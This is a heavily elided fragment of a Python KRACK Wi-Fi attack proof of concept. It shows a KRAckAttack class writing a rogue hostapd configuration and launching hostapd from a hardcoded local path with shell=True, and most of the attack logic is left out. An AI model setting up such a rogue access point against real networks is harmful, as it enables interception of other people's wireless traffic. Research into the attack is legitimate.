...
class KRAckAttack():
	...
	def run(self, strict_echo_test=False):
		...
		with open(os.path.realpath(os.path.join(self.script_path, "hostapd_rogue.conf")), "w") as fp:
		...
		self.hostapd = subprocess.Popen("/home/sun10/krackattacks-poc-zerokey/hostapd/hostapd /home/sun10/krackattacks-poc-zerokey/krackattack/hostapd_rogue.conf -dd -K", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
